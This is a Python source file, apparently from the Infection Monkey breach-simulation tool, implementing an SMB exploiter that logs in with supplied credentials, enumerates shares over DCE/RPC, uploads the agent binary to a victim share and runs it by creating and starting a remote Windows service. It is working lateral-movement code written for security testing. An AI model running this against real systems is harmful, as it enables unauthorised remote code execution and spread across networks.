import logging
import ntpath
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Optional, Sequence, Tuple

from impacket.dcerpc.v5 import scmr, srvs, transport
from impacket.smbconnection import SMBConnection

from common.credentials import Credentials
from common.event_queue import IAgentEventPublisher
from common.types import Event
from infection_monkey.exploit.tools import RemoteFileCopyError
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import TargetHost

from .smb_command_builder import build_smb_command
from .smb_options import SMBOptions
from .smb_utils import create_smb_connection, logout_guest, rpc_connect, smb_login

logger = logging.getLogger(__name__)

SERVICE_NAME = "InfectionMonkey"


class CopiedFileDetails:
    """Stores the details of a copied file"""

    def __init__(self, remote_path: str, destination_path: PurePath):
        self.remote_path = remote_path
        self.destination_path = destination_path


class SMBExploitClient:
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self, agent_event_publisher: IAgentEventPublisher, host: TargetHost, options: SMBOptions
    ):
        self._agent_event_publisher = agent_event_publisher
        self._host = host
        self._options = options
        self._smb: Optional[SMBConnection] = None
        self._copied_file_details: Optional[CopiedFileDetails] = None
        self._authenticated_credentials: Optional[Credentials] = None

    def authenticate(self, credentials: Credentials) -> bool:
        """Returns True if authentication succeeded, False otherwise
        Side effect: The SMB connection is established on success"""

        self._smb = create_smb_connection(self._host)
        if not self._smb:
            return False

        if not smb_login(self._smb, credentials):
            return False

        self._smb.setTimeout(self._options.smb_connect_timeout)

        if logout_guest(self._smb):
            return False

        self._authenticated_credentials = credentials
        return True

    def execute(
        self,
        servers: Sequence[str],
        current_depth: int,
        interrupt: Event,
    ):
        """Raises an exception if the execution failed"""
        if not self._authenticated_credentials:
            raise Exception("Not authenticated")
        rpc = self._connect_rpc(self._authenticated_credentials, self._options.smb_connect_timeout)

        if not self._copied_file_details:
            raise Exception("File was not copied before executing it")
        command = build_smb_command(
            servers,
            current_depth,
            self._copied_file_details.remote_path,
            self._copied_file_details.destination_path,
        )

        rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(rpc)
        sc_handle = resp["lpScHandle"]

        try:
            resp = scmr.hRCreateServiceW(
                rpc,
                sc_handle,
                SERVICE_NAME,
                SERVICE_NAME,
                lpBinaryPathName=command,
            )
        except scmr.DCERPCSessionError as err:
            if err.error_code == 0x431:
                logger.debug(f"Service '{SERVICE_NAME}' already exists, trying to start it")
                resp = scmr.hROpenServiceW(rpc, sc_handle, SERVICE_NAME)
            else:
                raise err

        service_handle = resp["lpServiceHandle"]
        scmr.hRStartServiceW(rpc, service_handle)
        scmr.hRDeleteService(rpc, service_handle)
        scmr.hRCloseServiceHandle(rpc, service_handle)

    def _connect_rpc(self, credentials, timeout):
        return rpc_connect(self._host, 139, credentials, timeout) or rpc_connect(
            self._host, 445, credentials, timeout
        )

    def copy_file(
        self,
        file: BytesIO,
    ):
        """Raises an exception if the copy failed"""
        if not self._query_server_info():
            raise RemoteFileCopyError("No server information is available")

        destination_path = get_agent_dst_path(self._host)
        shares = self._query_shares(destination_path)
        for remote_path, share_name, share_path in self._connected_shares(shares):
            logger.debug(
                f"Trying to copy monkey file to share '{share_name}' "
                f"[%s + %s] on victim {self._host}",
                share_path,
                remote_path,
            )

            try:
                if not self._smb:
                    raise RemoteFileCopyError("Not authenticated")
                self._smb.setTimeout(self._options.agent_binary_upload_timeout)
                self._smb.putFile(share_name, remote_path, file.read)

                logger.info(
                    f"Copied monkey agent to remote share '{share_name}' "
                    f"[{share_path}] on victim {self._host}"
                )

                self._copied_file_details = CopiedFileDetails(
                    ntpath.join(share_path, remote_path.strip(ntpath.sep)), destination_path
                )

            except Exception as exc:
                error_message = (
                    f"Error uploading monkey to share '{share_name}' on victim {self._host}: {exc}"
                )
                logger.error(error_message)
                raise RemoteFileCopyError(error_message)

    def _query_server_info(self):
        try:
            info = self._execute_rpc_call(srvs.hNetrServerGetInfo, 102)
        except Exception as err:
            logger.debug(f"Failed to query server info: {err}")
            return None

        return info

    def _execute_rpc_call(self, rpc_func, *args):
        """Executes an RPC call using DCE/RPC"""
        rpctransport = transport.SMBTransport(
            self._smb.getRemoteHost(),
            self._smb.getRemoteHost(),
            filename=r"\srvsvc",
            smb_connection=self._smb,
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)

        return rpc_func(dce, *args)

    def _query_shares(self, path: PurePath):
        resp = self._query_shared_resources()
        if not resp:
            return ()

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because max uses is exceeded",
                    self._host,
                )
                continue
            elif not share_path:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because share path is invalid",
                    self._host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(path).lower().startswith(share_path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share_path) :], share_info),)

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        return high_priority_shares + low_priority_shares

    def _query_shared_resources(self):
        try:
            shares = self._execute_rpc_call(srvs.hNetrShareEnum, 2)
        except Exception as err:
            logger.debug(f"Failed to query shared resources: {err}")
            return None

        return shares

    def _connected_shares(self, shares):
        """Yields a tuple of (remote_path, share_name, share_path)
        Side effect: the SMBConnection is connected to the share"""
        # Attempt to connect to a share over SMB
        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            # TODO: Do we really need to handle reconnects?
            if not self._smb:
                if not self._authenticated_credentials:
                    break
                self._connect_with_user(self._authenticated_credentials)
                if not self._smb:
                    break

            try:
                self._smb.connectTree(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {self._host}: {exc}'
                )
                continue

            yield remote_path, share_name, share_path

    def _connect_with_user(self, credentials: Credentials) -> bool:
        self._smb = create_smb_connection(self._host)
        if not self._smb:
            return False

        self._smb = smb_login(self._smb, credentials)
        if not self._smb:
            return False

        return True
